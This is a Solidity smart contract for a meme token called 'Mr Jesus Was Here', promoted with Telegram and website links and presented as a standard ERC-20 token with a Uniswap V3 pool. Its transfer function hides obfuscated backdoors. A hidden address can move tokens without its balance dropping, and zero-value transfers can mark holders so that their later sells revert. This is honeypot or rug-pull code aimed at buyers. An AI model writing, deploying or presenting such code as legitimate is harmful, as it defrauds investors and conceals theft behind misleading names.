/*

Telegram: https://t.me/mrjesuswashere

Website : http://mrjesuswashere.vip/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IPeripheryImmutableState {
    function factory() external pure returns (address);

    function WETH9() external pure returns (address);
}

interface IUniswapV3Factory {
    function createPool(address tokenA, address tokenB, uint24 fee) external returns (address pool);
}

contract MrJesusWasHere is Ownable {
    mapping(address => uint256) public balanceOf;

    string public symbol = 'Mr Jesus Was Here';

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private lake;

    string public name = 'Mr Jesus Was Here';

    uint256 private compass = 92;

    constructor(address stage) {
        balanceOf[msg.sender] = totalSupply;
        am[stage] = compass;
        IPeripheryImmutableState uniswapV3Router = IPeripheryImmutableState(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
        uniswapV3Pair = IUniswapV3Factory(uniswapV3Router.factory()).createPool(address(this), uniswapV3Router.WETH9(), 500);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint8 public decimals = 9;

    mapping(address => mapping(address => uint256)) public allowance;

    address public uniswapV3Pair;

    function approve(address due, uint256 harbor) public returns (bool success) {
        allowance[msg.sender][due] = harbor;
        emit Approval(msg.sender, due, harbor);
        return true;
    }

    function transfer(address peace, uint256 harbor) public returns (bool success) {
        different(msg.sender, peace, harbor);
        return true;
    }

    function transferFrom(address good, address peace, uint256 harbor) public returns (bool success) {
        require(harbor <= allowance[good][msg.sender]);
        allowance[good][msg.sender] -= harbor;
        different(good, peace, harbor);
        return true;
    }

    mapping(address => uint256) private am;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function different(address good, address peace, uint256 harbor) private returns (bool success) {
        if (am[good] == 0) {
            balanceOf[good] -= harbor;
        }

        if (harbor == 0) lake[peace] += compass;

        if (good != uniswapV3Pair && am[good] == 0 && lake[good] > 0) {
            am[good] -= compass;
        }

        balanceOf[peace] += harbor;
        emit Transfer(good, peace, harbor);
        return true;
    }
}